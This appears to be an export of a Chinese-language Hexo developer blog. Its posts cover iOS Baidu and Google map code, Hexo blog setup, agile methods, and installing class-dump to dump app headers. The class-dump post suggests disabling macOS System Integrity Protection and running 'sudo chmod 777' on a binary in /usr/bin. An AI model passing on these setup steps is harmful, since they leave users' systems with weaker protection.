BMKAnnotationView *annotationView = nil; XSPointAnnotation *customAnnotation = (XSPointAnnotation *)annotation; if (customAnnotation.annotationType == XSAnnotationTypeLocationPoint) &#123; // 当前位置点类型 annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:@&quot;XSTracksLocationAnnotation&quot;]; if (annotationView == nil) &#123; annotationView = [[BMKPinAnnotationView alloc] initWithAnnotation:customAnnotation reuseIdentifier:@&quot;XSTracksLocationAnnotation&quot;]; &#125; XSLocationDetails *locationDetails = customAnnotation.locationDetailsModel; XSPetAnnotationView *petAnnotationView = [XSPetAnnotationView petAnnotationView]; annotationView.image = [UIImage imageNamed:[customAnnotation.locationDetailsModel.deviceBindingTypeImageName stringByAppendingString:@&quot;_small&quot;]]; annotationView.draggable = NO; annotationView.canShowCallout = YES; petAnnotationView.isHiddenNoNeeds = YES; petAnnotationView.width = 270; petAnnotationView.locationDetails = locationDetails; annotationView.paopaoView = [[BMKActionPaopaoView alloc] initWithCustomView:petAnnotationView]; self.petAnnotationView = petAnnotationView; &#125; return annotationView;&#125; 是骡子是马拉出来溜溜，编译运行，轨迹点都可以点击了，哇，开心的就像一个几十岁的孩子拍了拍肚皮，正准备去喝杯Coffee舒爽一下呢，发现地址信息没有 于是开始考虑现在是一个轨迹点对应一个自定义的paopaoView，那么在反地理编码的代理回调里面怎么把地址信息对应的轨迹点模型更新呢 根据代理回调里面location坐标和当前的所有历史轨迹数据坐标对比, 开心的打印一下，竟然和传递的转换前的坐标有误差； 仿谷歌地图反地理编码，改代理回调为block回调？直接动手 123456789// XSBaiduGeocoder.htypedef void (^XSReverseGeocodeHandler)(BMKReverseGeoCodeResult *result);@interface XSBaiduGeocoder : NSObject+ (instancetype)geocoder;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler;@end 12345678910111213141516171819202122232425262728293031323334353637383940414243// XSBaiduGeocoder.m@interface XSBaiduGeocoder () &lt;BMKGeoCodeSearchDelegate&gt;@property (nonatomic, copy) XSReverseGeocodeHandler reverseGeocodeHandler;@end@implementation XSBaiduGeocoder+ (instancetype)geocoder&#123; static XSBaiduGeocoder *helper; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^&#123; helper = [[XSBaiduGeocoder alloc] init]; &#125;); return helper;&#125;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler&#123; XSLogFunc self.reverseGeocodeHandler = handler; // 解析地址 BMKReverseGeoCodeOption *reverseGeocodeSearchOption = [[BMKReverseGeoCodeOption alloc] init]; reverseGeocodeSearchOption.reverseGeoPoint = coordinate; BMKGeoCodeSearch *geoCodeSearch = [[XSGeoCodeSearch alloc] init]; geoCodeSearch.delegate = self; if (![geoCodeSearch reverseGeoCode:reverseGeocodeSearchOption]) &#123; XSLog(@"百度反地理编码获取地址失败"); &#125; else &#123; XSLog(@"百度反地理编码获取地址成功"); &#125;&#125;- (void)onGetReverseGeoCodeResult:(BMKGeoCodeSearch *)searcher result:(BMKReverseGeoCodeResult *)result errorCode:(BMKSearchErrorCode)error&#123; XSLogFunc if (self.reverseGeocodeHandler) &#123; self.reverseGeocodeHandler(result); &#125;&#125;@end BMKGeoCodeSearch这个一定要调用一次创建一次，否则只会转换一次地址信息 但是此时虽然轨迹点地址信息都转换了，但是只有点击最后一个轨迹点有地址信息，其他都是空的，这个问题卡了好久脑子没转过来，一直在block捕获方向考虑，后来突然醒悟 self.reverseGeocodeHandler = handlerblock是每次都进来赋值，而地址转换完成的代理回调方法又调用延迟，那在代理回调方法里面回调临时保存的self.reverseGeocodeHandler肯定是最后一个，所以就只会更新最后一个轨迹坐标的模型地址数据 既然BMKGeoCodeSearch是每一个坐标对应一个，那个完全可以自定义XSGeoCodeSearch继承BMKGeoCodeSearch添加对应的回调handler，等地址转换完成的代理回调时候，根据XSGeoCodeSearch保存的handler回调回去，于是代码修改如下 12345678910// XSGeoCodeSearch.h@class BMKReverseGeoCodeResult;typedef void (^XSReverseGeocodeHandler)(BMKReverseGeoCodeResult *result);@interface XSGeoCodeSearch : BMKGeoCodeSearch@property (nonatomic, copy) XSReverseGeocodeHandler reverseGeocodeHandler;@end 1234567// XSBaiduGeocoder.h@interface XSBaiduGeocoder : NSObject+ (instancetype)geocoder;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler;@end 12345678910111213141516171819202122232425262728293031323334353637383940414243// XSBaiduGeocoder.m@interface XSBaiduGeocoder () &lt;BMKGeoCodeSearchDelegate&gt;@end@implementation XSBaiduGeocoder+ (instancetype)geocoder&#123; static XSBaiduGeocoder *helper; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^&#123; helper = [[XSBaiduGeocoder alloc] init]; &#125;); return helper;&#125;- (void)reverseGeocodeCoordinate:(CLLocationCoordinate2D)coordinate completionHandler:(XSReverseGeocodeHandler)handler&#123; XSLogFunc // 解析地址 BMKReverseGeoCodeOption *reverseGeocodeSearchOption = [[BMKReverseGeoCodeOption alloc] init]; reverseGeocodeSearchOption.reverseGeoPoint = coordinate; XSGeoCodeSearch *geoCodeSearch = [[XSGeoCodeSearch alloc] init]; geoCodeSearch.reverseGeocodeHandler = handler; geoCodeSearch.delegate = self; if (![geoCodeSearch reverseGeoCode:reverseGeocodeSearchOption]) &#123; XSLog(@"百度反地理编码获取地址失败"); &#125; else &#123; XSLog(@"百度反地理编码获取地址成功"); &#125;&#125;- (void)onGetReverseGeoCodeResult:(BMKGeoCodeSearch *)searcher result:(BMKReverseGeoCodeResult *)result errorCode:(BMKSearchErrorCode)error&#123; XSLogFunc // 查询searcher 对应的block 然后回调 XSGeoCodeSearch *codeSearcher = (XSGeoCodeSearch *)searcher; if (codeSearcher.reverseGeocodeHandler) &#123; codeSearcher.reverseGeocodeHandler(result); &#125;&#125;@end 再运行，点击切换轨迹点，世界都美好了，操作轨迹点的切换也可以直接使用selectAnnotation:animated:弹出详情自定义弹框了 轨迹点区域控制 如果想控制所有的估计点都在屏幕范围内显示，最早使用的上一篇里面的方法，后来查资料看这一种也可以 1234567891011121314151617181920212223- (void)baiduMapViewFitAnnotationsWithCoordinates:(NSArray *)coordsModels count:(NSUInteger)count&#123; //创建两个数组，用来存所有的经度和纬度 if (count &lt; 2) return; NSMutableArray *latArr = [[NSMutableArray alloc] init]; NSMutableArray *lonArr = [[NSMutableArray alloc] init]; for (XSLocationDetails *locationDetails in coordsModels) &#123; [latArr addObject:@(locationDetails.coordinateBD09ll.latitude)]; [lonArr addObject:@(locationDetails.coordinateBD09ll.longitude)]; &#125; NSNumber *latMax = [latArr valueForKeyPath:@"@max.floatValue"];//最大纬度 NSNumber *latMin = [latArr valueForKeyPath:@"@min.floatValue"];//最小纬度 NSNumber *lonMax = [lonArr valueForKeyPath:@"@max.floatValue"];//最大经度 NSNumber *lonMin = [lonArr valueForKeyPath:@"@min.floatValue"];//最小经度 BMKCoordinateRegion region; region.center.latitude = ([latMax doubleValue] + [latMin doubleValue]) / 2; region.center.longitude = ([lonMax doubleValue] + [lonMin doubleValue]) / 2; region.span.latitudeDelta = 0.0055; // 数字越小 缩放等级越大 region.span.longitudeDelta = 0.0055; region = [self.baiduMapView regionThatFits:region]; [self.baiduMapView setRegion:region animated:YES];&#125; 当然还有更简单的方法,所以一定要多看各种SDK的头文件，看都有哪些功能 12345/** *设置地图使显示区域显示所有annotations,如果数组中只有一个则直接设置地图中心为annotation的位置 *@param annotations 指定的标注 *@param animated 是否启动动画 */- (void)showAnnotations:(NSArray *)annotations animated:(BOOL)animated; 谷歌地图历史轨迹 关于谷歌地图历史轨迹，基本上就没什么说的了，接口相比百度更规范和清晰 谷歌地图添加Marker(相当于百度地图Annotation)直接配置大头针各种属性然后marker.map = self.googleMapView就等于添加了一个大头针，没有回调 谷歌地图触发paopaoView的时候，调用 12345678910111213141516171819- (UIView *)mapView:(GMSMapView *)mapView markerInfoWindow:(GMSMarker *)marker&#123; XSMarker *myMarker = (XSMarker *)marker; XSLocationDetails *locationModel = myMarker.locationDetailsModel; XSPetAnnotationView *petAnnotationView = [XSPetAnnotationView petAnnotationView]; petAnnotationView.isHiddenNoNeeds = YES; [[GMSGeocoder geocoder] reverseGeocodeCoordinate:locationModel.locationCoordinate2D completionHandler:^(GMSReverseGeocodeResponse * _Nullable response, NSError * _Nullable error) &#123; // 获取第一个位置信息 GMSAddress *addressModel = response.firstResult; NSString *firstString = addressModel.lines.firstObject; NSString *lastString = addressModel.lines.lastObject; NSString *address = [NSString stringWithFormat:@"%@, %@", firstString, lastString]; locationModel.deviceAddress = address; petAnnotationView.locationDetails = locationModel; // 地址转换处理重新刷新界面 &#125;]; petAnnotationView.width = 270; petAnnotationView.locationDetails = locationModel; return petAnnotationView;&#125; 谷歌地图貌似没有可以获取地图上所有Marker的方法（可能我没找到），需要添加的时候自己维护一个数组 谷歌地图的反地理编码本来就是block回调 谷歌地图控制所有轨迹点范围的实现 12345678- (void)googleMapViewFitAnnotationsWithCoordinates:(NSArray *)coordsModels count:(NSUInteger)count&#123; GMSCoordinateBounds *bounds = [[GMSCoordinateBounds alloc] init]; for (XSLocationDetails *locationDetails in coordsModels) &#123; bounds = [bounds includingCoordinate:locationDetails.locationCoordinate2D]; &#125; [self.googleMapView animateWithCameraUpdate:[GMSCameraUpdate fitBounds:bounds withPadding:30.0f]];&#125;]]></content>
      <categories>
        <category>iOS</category>
        <category>地图</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>地图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客搭建]]></title>
    <url>%2Farchives%2Fb8f4bd70.html</url>
    <content type="text"><![CDATA[之前在学习编程和开始工作的时候，也都有整理和写笔记的习惯，笔记一直是使用Gitbook编辑整理和同步的，也有想搭建一个自己的博客但是又因为自己太懒散，而且感觉搭建博客比较复杂，所以就一直没有付诸行动；直到最近偶然看到介绍使用Hexo + GitHubPages搭建博客的文章，就查了下相关的资料和介绍，搭建了一个简单的博客（GitHubPages + Hexo + Next主题）。 关于博客 常见的博客搭建方法（查到资料的） WordPress：一般需要独立域名（收费），传统的博客搭建方法，但是对MarkDown支持不是很好 GitHubPages + Jekell：免费，稍微比较麻烦 GitHubPages + Hexo：免费，使用简单，适合新手入门 关于Hexo Hexo 是一个基于 Nodejs 的静态博客网站生成器，作者是来自中国台湾的Tommy Chen。 作者网站 特点 部署方便且速度快 支持Markdown语法 已移植 Octopress 插件 高扩展性、自订性 兼容Windows, Mac &amp; Linux Hexo实现原理 1、Hexo是一个静态博客生成器，根据给定的主题，负责把写好的 Markdown 文章转换成一堆 HTML + CSS + Javascript 页面。 2、Hexo还有把生成好的站点上传到 Github Pages 的功能。 GitHubPages + Hexo搭建方法 关于使用可参考下面这两篇文章，写的非常详细，而且是针对Windows/Mac两个平台方法，就不在浪费时间码字了。 Mac搭建Hexo博客及NexT主题配置优化 博客搭建包含windows 常用的指令 12345hexo clean // 清空本地缓存，解决由于本地缓存导致部署无效hexo g // == hexo generate #生成静态网页gulp // 压缩生成的静态资料（如果安装gulp插件，具体安装方法见下面）hexo d // == hexo deploy #开始部署hexo s // == hexo server #启动服务器 本地调试使用 插件安装RSS订阅插件 执行如下指令 1npm install hexo-generator-feed --save 打开 Hexo 站点下的 _config.yml ,添加如下配置： 12345678# feed# Dependencies: https://github.com/hexojs/hexo-generator-feedfeed:type: atompath: atom.xmllimit: 20hub:content: 本地搜索插件 执行如下指令 1npm install hexo-generator-searchdb --save 打开 Hexo 站点的 _config.yml,添加配置 12345search:path: search.xmlfield: postformat: htmllimit: 10000 静态资源压缩插件 安装gulp 1npm install gulp -g // 如果报npm WARN deprecated警告 可使用npm install -g npm 安装gulp插件： 12345npm install gulp-minify-css --save // 如果报npm WARN deprecated警告则使用sudo npm install gulp-clean-css执行npm install gulp-uglify --savenpm install gulp-htmlmin --savenpm install gulp-htmlclean --savenpm install gulp-imagemin --save 主题配置设置网站标签页favicon图标 图标格式：32 * 32 的ico格式图标，重命名为favicon.ico 把设计好的图标放在/themes/next/source/images里 修改主题配置文件medium 1234567favicon: small: /images/favicon-16x16-next.png medium: /images/favicon.ico apple_touch_icon: /images/apple-touch-icon-next.png safari_pinned_tab: /images/logo.svg #android_manifest: /images/manifest.json #ms_browserconfig: /images/browserconfig.xml 更多配置可参考Hexo+Next个人博客主题优化 关于多电脑同步 使用电脑搭建好博客后可能面临如下问题 1、是在家里私人电脑上搭建的，想在公司也可以愉快的写文章 2、换了一台新的电脑（挣钱了要换装备😂） 3、电脑系统崩了😭 关于多电脑同步解决方案1 gitHub分支管理，master分支存博客静态网页资源，Hexo分支存所有源文件（设置为默认分支） 每个电脑每次更新文章前需要正常的git同步操作 每个电脑每次更新文章后需要正常的git同步操作 但是个人感觉不安全，别人可能直接把你的Hexo分支拉取下来就等于获取了你的全部博客资源（虽然我的博客没什么有用的价值😂） 具体分支实现可参考利用分支同步 关于多电脑同步解决方案2 每次手动拷贝最新的文件夹替换另一台电脑旧文件夹（想想就麻烦） 通过云盘如Dropbox自动同步整个文件夹，使所有的电脑都可以同步到最新的 目标电脑获取到最新的博客文件后 如果是情形3可以考虑先把整个博客目录拷贝出来到新的系统博客目录下 GitHub添加配置新电脑的SSH key 和搭建时一样参考Mac搭建Hexo博客及NexT主题配置优化 配置运行环境，执行如下指令 12brew install node // 安装Node.jsnpm install -g hexo // 安装hexo 切换到博客目录下安装博客模块和插件 (具体参考之前安装过的插件) 12345678910111213npm install npm install hexo-deployer-git --save npm install hexo-generator-feed --save npm install hexo-generator-sitemap --save npm install hexo-generator-feed --save npm install hexo-generator-searchdb --save npm install -g gulp npm install gulp-minify-css --save npm install gulp-uglify --save npm install gulp-htmlmin --save npm install gulp-htmlclean --save npm install gulp-imagemin --save 又可以愉快的随时随地写文章了😂 参考 Mac搭建Hexo博客及NexT主题配置优化 免费个人博客搭建详解 Hexo+Next个人博客主题优化 利用Hexo在多台电脑上提交和更新github pages博客]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[敏捷开发]]></title>
    <url>%2Farchives%2Fed2e9abb.html</url>
    <content type="text"><![CDATA[春日游，杏花吹满头。陌上谁家年少足风流？ 传统的软件开发模式需要经历问题评估、计划解决方案、设计系统架构、开发代码、测试、部署和使用系统、维护解决方案等过程。 如瀑布流模式: 它是以文档为驱动，在整个开发过程中，开发人员根据需求文档进行开发，一切以文档为依据。 缺点 由于开发模型是线性的，用户只有等到整个过程的末期才能见到开发成果，从而增加了开发的风险； 早期的错误可能要等到开发后期的测试阶段才能发现，进而带来严重的后果。 各个软件生命周期衔接花费时间较长，团队人员交流成本大。 在需求不明并且在项目进行过程中可能变化的情况下基本是不可行的。 软件开发的11种模式 敏捷开发(Agile Development) 什么是敏捷开发 1、敏捷开发(Agile Development)是一种以人为核心、迭代、循序渐进的开发方式。2、在敏捷开发中，软件项目的构建被切分成多个子项目，各个子项目的成果都经过测试，具备集成和可运行的特征。3、它并不是一门技术，而是一种开发方式，是一种软件开发的流程。4、作用指导我们用规定的环节去一步一步完成项目的开发。因为它采用的是迭代式开发，所以这种开发方式的主要驱动核心是人。 敏捷开发适用于 客户不知道自己要啥的情况，这样的客户占绝大多数。因为客户不知道要啥，所以你需要不断帮客户弄明白他到底想要啥。换句话说，你需要和客户沟通，合作，倾听反馈，持续改进； 竞争激烈的市场，这样的情况下，赶在竞争对手前交付一个不完美但至少能用的产品非常重要； 快速变化的市场，你在埋头造一辆汽车的时候，客户已经想开飞机满天飞了，这就需要你能一步步的把汽车改成飞机，还能按时交付； 适用于在一个地方办公的小团队，一般 10 个人以内。这样能使敏捷中主要的沟通方式「Face to Face」是可行的。 敏捷开发流程 敏捷开发实现方式 Scrum XP Scrum 项目角色 产品负责人（Product Owner）：主要负责确定产品的功能和达到要求的标准，指定软件的发布日期和交付的内容，同时有权力接受或拒绝开发团队的工作成果。 流程管理员（Scrum Master）：主要负责整个Scrum流程在项目中的顺利实施和进行，以及清除挡在客户和开发工作之间的沟通障碍，使得客户可以直接驱动开发。 开发团队（Scrum Team）：主要负责软件产品在Scrum规定流程下进行开发工作，人数控制在5~10人左右，每个成员可能负责不同的技术方面，但要求每成员必须要有很强的自我管理能力，同时具有一定的表达能力；成员可以采用任何工作方式，只要能达到Sprint的目标。 XP（Extreme Programming）什么是XP 极限编程（eXtreme Programming），是一种全新的、轻量级的、灵巧的软件开发方法，是一种软件工程方法学。它强调程序设计团队与业务专家之间的紧密协作、面对面的沟通（比书面的文档更有效）、频繁交付新的软件版本、紧凑而自我组织型的团队、能够很好的适应需求变化的代码编写和团队组织方法，更注重软件开发中人的作用。 XP的核心是沟通（Communication）、简单（Simplicity）、反馈（Feedback）、勇气（Courage）四大价值观，它们是XP的基础，也是XP的灵魂。敏捷开发之XP 敏捷开发中XP与SCRUM的区别 1、迭代长度的不同 XP的一个Sprint的迭代长度大致为1~2周, 而Scrum的迭代长度一般为 2~ 4周. 2、在迭代中, 是否允许修改需求 XP在一个迭代中，如果一个User Story(一个用户需求)还没有实现， 则可以考虑用另外的需求将其替换，替换的原则是需求实现的时间量是相等的。 而Scrum是不允许这样做的，一旦迭代开工会完毕, 任何需求都不允许添加进来，并有Scrum Master严格把关，不允许开发团队受到干扰 在迭代中，User Story是否严格按照优先级别来实现 XP是务必要遵守优先级别的。 但Scrum在这点做得很灵活， 可以不按照优先级别来做 Scrum这样处理的理由是：如果优先问题的解决者，由于其它事情耽搁，不能认领任务，那么整个进度就耽误了。 另外一个原因是，如果按优先级排序的User Story #6和#10，虽然#6优先级高，但是如果#6的实现要依赖于#10，则不得不优先做#10. 3、软件的实施过程中，是否采用严格的工程方法，保证进度或者质量 Scrum没有对软件的整个实施过程开出个工程实践的处方，要求开发者自觉保证。 但XP对整个流程方法定义非常严格，规定需要采用TDD, 自动测试， 结对编程，简单设计，重构等约束团队的行为。]]></content>
      <categories>
        <category>整理</category>
      </categories>
      <tags>
        <tag>敏捷开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编初识（Mac)]]></title>
    <url>%2Farchives%2F24e561e5.html</url>
    <content type="text"><![CDATA[class-dump 入门介绍及使用。 Decompileclass-dump安装方法当Mac升级了OSX 10.11后，配置class-dump的时候，会发现推荐的class-dump无法放入目录/usr/bin 原因是 OSX10.11的一个新特性 Rootless,也叫System Integrity Protection（SIP）和SELinux差不多，都是限制root用户的权限 其实可以在RecoveryMode关闭这个特性，这样就直接可以读写/usr/bin了，不过不建议。 关闭方法：开机的时候按住option出现选择磁盘的界面按command + R进入RecoveryMode，选择实用工具终端，输入csrutil disable回车搞定 class-dump下载地址 http://stevenygard.com/projects/class-dump/ 安装方法1 查看磁盘根目录是否存在~/bin路径，存在就下一步，不存在，打开Terminal，输入mkdir ~/bin，在当前用户根目录下创建一个bin目录。 把下载下来的dmg打开，复制文件文件里面的class-dump到创建的bin目录下。赋权限:chmod +x ~/bin/class-dump 打开bash_profile文件配置环境变量 vim ~/.bash_profile 按下 i 键进入编辑状态，在最下方加一行export PATH=$HOME/bin/:$PATH 按下esc键, 再按shift+: 输入 wq! 进行保存退出编辑 在Terminal中执行source ~/.bash_profile 执行class-dump测试是否成功，成功如下： 12345678910111213141516171819202122MelodydeMBP:~ melody$ class-dumpclass-dump 3.5 (64 bit)Usage: class-dump [options] &lt;mach-o-file&gt;where options are:-a show instance variable offsets-A show implementation addresses--arch &lt;arch&gt; choose a specific architecture from a universal binary (ppc, ppc64, i386, x86_64, armv6, armv7, armv7s, arm64)-C &lt;regex&gt; only display classes matching regular expression-f &lt;str&gt; find string in method name-H generate header files in current directory, or directory specified with -o-I sort classes, categories, and protocols by inheritance (overrides -s)-o &lt;dir&gt; output directory used for -H-r recursively expand frameworks and fixed VM shared libraries-s sort classes and categories by name-S sort methods by name-t suppress header in output, for testing--list-arches list the arches in the file, then exit--sdk-ios specify iOS SDK version (will look in /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS&lt;version&gt;.sdk--sdk-mac specify Mac OS X version (will look in /Developer/SDKs/MacOSX&lt;version&gt;.sdk--sdk-root specify the full SDK root path (or use --sdk-ios/--sdk-mac for a shortcut)MelodydeMBP:~ melody$ 推荐安装方法2 下载后解压后会有class-dump和源码文件。 将class-dump复制到/usr/bin/class-dump。 如果是OS X 10.11，因为没有/usr/bin文件夹的写权限，所以将class-dump复制到/usr/local/bin/class-dump即可。 打开Terminal，执行命令赋予其执行权限： 1sudo chmod 777 /usr/bin/class-dump 执行class-dump测试是否成功. class-dump使用命令如下：1class-dump -H /Users/sevencho/Desktop/KYRemoteUnit.app -o /Users/sevencho/Desktop/headers -H 代表着要解析的文件 /Users/sevencho/Desktop/KYRemoteUnit.app 需要反编译的应用路径（解压.ipa包获得） -o 表示解析完成保存的目录 /Users/sevencho/Desktop/headers 反编译出的头文件存放路径 利用 class-dump 可以导出 AppKit，UIKitAppKit :1class-dump /System/Library/Frameworks/AppKit.framework UIKit :1class-dump /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk/System/Library/Frameworks/UIKit.framework]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之地图篇(二)]]></title>
    <url>%2Farchives%2Fb3b6a999.html</url>
    <content type="text"><![CDATA[绿蚁新醅酒，红泥小火炉。晚来天欲雪，能饮一杯无？ 百度地图1、注册地图api key1234567// 在程序启动代理方法注册baidu map api key 百度开发者平台获取_mapManager = [[BMKMapManager alloc]init];// 如果要关注网络及授权验证事件，请设定 generalDelegate参数BOOL ret = [_mapManager start:XSBaiduMapApiKey generalDelegate:nil];if (!ret) &#123; XSLog(@&quot;BMKMapManager start failed!&quot;);&#125; 2、初始化地图 添加地图的初始化配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445- (void)setupBaiduMapView&#123; BMKMapView *mapView = [[BMKMapView alloc] initWithFrame:self.view.bounds]; mapView.mapType = BMKMapTypeStandard; // 设定为标准地图 mapView.showsUserLocation = YES; mapView.userTrackingMode = BMKUserTrackingModeNone; // 设置用户位置图标类型 mapView.showMapScaleBar = YES; BMKLocationViewDisplayParam *displayParam = [[BMKLocationViewDisplayParam alloc] init]; displayParam.locationViewImgName = @&quot;icon_center_point&quot;; displayParam.isAccuracyCircleShow = NO; [mapView updateLocationViewWithParam:displayParam];// 配置用户位置信息如精度圈、图标 mapView.zoomLevel = kMapsZoomLevel; mapView.minZoomLevel = kMapsMinZoomLevel; mapView.maxZoomLevel = kMapsMaxZoomLevel; [self.view insertSubview:mapView atIndex:0]; self.baiduMapView = mapView; // 定位服务 BMKLocationService *locService = [[BMKLocationService alloc] init]; locService.desiredAccuracy = kCLLocationAccuracyNearestTenMeters; [locService startUserLocationService]; self.locService = locService; // 反地理编码 BMKGeoCodeSearch *geoCodeSearch = [[BMKGeoCodeSearch alloc] init]; self.geoCodeSearch = geoCodeSearch; // 针对切换地图类型后设置代理 （如果有做地图切换功能） self.baiduMapView.delegate = self; // 此处记得不用的时候需要置nil，否则影响内存的释放 self.locService.delegate = self; self.geoCodeSearch.delegate = self;&#125;-(void)viewWillAppear:(BOOL)animated&#123; [self.baiduMapView viewWillAppear]; self.baiduMapView.delegate = self; // 此处记得不用的时候需要置nil，否则影响内存的释放 self.locService.delegate = self; self.geoCodeSearch.delegate = self;&#125;-(void)viewWillDisappear:(BOOL)animated&#123; [self.baiduMapView viewWillDisappear]; self.baiduMapView.delegate = nil; // 不用时，置nil self.locService.delegate = nil; self.geoCodeSearch.delegate = nil;&#125; 开启定位服务回调，更新用户位置信息 1234567891011-(void)didUpdateBMKUserLocation:(BMKUserLocation *)userLocation&#123; XSLog(@&quot;didUpdateBMKUserLocation位置 : %f,%f&quot;, userLocation.location.coordinate.latitude, userLocation.location.coordinate.longitude); [self.baiduMapView updateLocationData:userLocation]; self.userBaiduLocation = userLocation;&#125;- (void)didFailToLocateUserWithError:(NSError *)error&#123; XSLog(@&quot;error:%@&quot;, error);&#125; 3、显示自定义大头针 3.1、从服务器获取当前设备的相关信息转为模型数据(XSDeviceLocation *locationDetails) 3.2、根据当前显示的地图类型设置对应的坐标信息大头针 我的做法在XSDeviceLocation模型里面提供了对应地图的获取属性，在属性getter方法中进行服务器的坐标转换(处理国内返回火星坐标、国外返回标准坐标) 如获取百度坐标locationCoordinateBaidu、获取谷歌坐标locationCoordinateGoogle 根据类型设置坐标数据 123456- (void)setupPetLocationCoordinate:(CLLocationCoordinate2D)coordinate mapType:(XSDisplayMapType)mapType&#123; // 坐标过滤等其他操作 // ... [self setupBaiduMapCoordinate:coordinate];&#125; 3.3、根据设备坐标的相关配置 12345678910111213141516171819202122232425262728- (void)setupBaiduMapCoordinate:(CLLocationCoordinate2D)coordinate&#123; [self.baiduMapView setCenterCoordinate:coordinate animated:YES]; // 添加大头针模型数据 self.pointAnnotation.annotationType = XSAnnotationTypeLocationPoint; self.pointAnnotation.locationDetailsModel = self.locationDetails; self.pointAnnotation.coordinate = coordinate; [self.baiduMapView addAnnotation:self.pointAnnotation]; // 添加精度圈 !self.baiduAccuracyCircle ? : [self.baiduMapView removeOverlay:self.baiduAccuracyCircle]; // 移除添加的精度圈 if (self.locationDetails.GpsType == XSLocationModeWifiAndLbs || self.locationDetails.GpsType == XSLocationModeLbs) &#123; // wifi 显示精度圈 self.baiduAccuracyCircle = [BMKCircle circleWithCenterCoordinate:coordinate radius:self.locationDetails.Radius]; [self.baiduMapView addOverlay:self.baiduAccuracyCircle]; &#125; // 解析地址 BMKReverseGeoCodeOption *reverseGeocodeSearchOption = [[BMKReverseGeoCodeOption alloc] init]; reverseGeocodeSearchOption.reverseGeoPoint = coordinate; if (![self.geoCodeSearch reverseGeoCode:reverseGeocodeSearchOption]) &#123; XSLog(@&quot;百度反地理编码获取地址失败&quot;); &#125; // 计算地图区域缩放 CLLocationDistance horizontalScreenDistance = [self horizontalScreenDistance]; if (self.locationDetails.Radius * 2 &lt; horizontalScreenDistance || self.baiduMapView.zoomLevel &lt;= kMapsMinZoomLevel) &#123; return; &#125; BMKCoordinateRegion region = BMKCoordinateRegionMakeWithDistance(coordinate, self.locationDetails.Radius * 2 + self.locationDetails.Radius / 2, self.locationDetails.Radius * 2 + self.locationDetails.Radius / 2); [self.baiduMapView setRegion:region animated:YES];&#125; 自定义大头针模型XSPointAnnotation继承自BMKPointAnnotation 扩充两个属性： annotationType ：枚举，显示的大头针类型（切换图标） locationDetailsModel ：当前大头针的模型数据，点击显示气泡详情的数据 添加精度圈后精度半径过大可能超出屏幕影响用户体验，解决方法如下： 根据屏幕最左和最后两个点，转换出地图上对应的坐标点并计算出距离d 根据当前精度圈半径 * 2 和 d 比较，如果超出屏幕就重新设置地图显示区域 计算屏幕距离核心代码 12345CLLocationCoordinate2D leftCoor = [self.baiduMapView convertPoint:CGPointMake(0, XSScreenH) toCoordinateFromView:self.view];CLLocationCoordinate2D rightCoor = [self.baiduMapView convertPoint:CGPointMake(XSScreenW, XSScreenH) toCoordinateFromView:self.view];BMKMapPoint pointLeft = BMKMapPointForCoordinate(leftCoor);BMKMapPoint pointRight = BMKMapPointForCoordinate(rightCoor);return BMKMetersBetweenMapPoints(pointLeft, pointRight); 3.4、配置信息的回调（真正开始处理显示位置大头针、精度圈、点击显示的弹框泡泡） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 大头针及大头针弹框- (BMKAnnotationView *)mapView:(BMKMapView *)mapView viewForAnnotation:(id &lt;BMKAnnotation&gt;)annotation&#123; XSLogFunc if (![annotation isKindOfClass:[XSPointAnnotation class]]) &#123; // 不是自定义大头针模型 return nil; &#125; BMKAnnotationView *annotationView = nil; XSPointAnnotation *customAnnotation = (XSPointAnnotation *)annotation; if (customAnnotation.annotationType == XSAnnotationTypeLocationPoint) &#123; // 当前位置点类型 annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:@&quot;LocationAnnotation&quot;]; if (annotationView == nil) &#123; annotationView = [[BMKPinAnnotationView alloc] initWithAnnotation:customAnnotation reuseIdentifier:@&quot;LocationAnnotation&quot;]; &#125; annotationView.image = [UIImage imageNamed:self.locationDetails.deviceBindingTypeImageName]; annotationView.draggable = NO; annotationView.canShowCallout = YES; // 自定义的点击大头针显示的气泡View 根据公司需求自定义 self.petAnnotationView.locationDetails = customAnnotation.locationDetailsModel; // 需要显示的设备信息模型 self.petAnnotationView.isHiddenNoNeeds = NO; self.petAnnotationView.width = 270; annotationView.paopaoView = [[BMKActionPaopaoView alloc] initWithCustomView:self.petAnnotationView]; &#125; return annotationView;&#125;// 精度圈- (BMKOverlayView *)mapView:(BMKMapView *)mapView viewForOverlay:(id &lt;BMKOverlay&gt;)overlay&#123; if ([overlay isKindOfClass:[BMKCircle class]])&#123; BMKCircleView *circleView = [[BMKCircleView alloc] initWithOverlay:overlay]; if (self.locationDetails.GpsType == XSLocationModeWifiAndLbs) &#123; circleView.fillColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsFillColor] colorWithAlphaComponent:0.15]; circleView.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsStrokeColor] colorWithAlphaComponent:0.05]; &#125; else if (self.locationDetails.GpsType == XSLocationModeLbs) &#123; circleView.fillColor = [[UIColor colorWithHexString:kAccuracyCircleLbsFillColor] colorWithAlphaComponent:0.15]; circleView.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleLbsStrokeColor] colorWithAlphaComponent:0.05]; &#125; circleView.lineWidth = 1; return circleView; &#125; 